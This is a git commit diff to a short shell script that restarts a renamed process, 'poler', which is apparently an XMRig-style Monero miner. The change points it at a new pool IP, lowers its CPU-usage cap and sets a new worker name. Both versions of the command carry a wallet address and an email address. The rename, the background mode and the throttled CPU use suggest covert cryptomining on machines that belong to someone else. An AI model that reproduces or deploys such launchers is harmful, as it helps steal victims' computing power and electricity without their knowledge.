e2b9c03595ea4e52087a4718d84d706921b4f272
burkabest <52100051+burkabest@users.noreply.github.com>
2019-07-09 14:20:16 +0300

    Update 40.sh

--- 40.sh
+++ 40.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 82 --cpu-priority 8 -o 94.103.88.27:5997 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=worker1:robbertopp1@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 74 --cpu-priority 8 -o 94.103.90.20:5997 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=myfirstss:robbertopp1@gmail.com -k
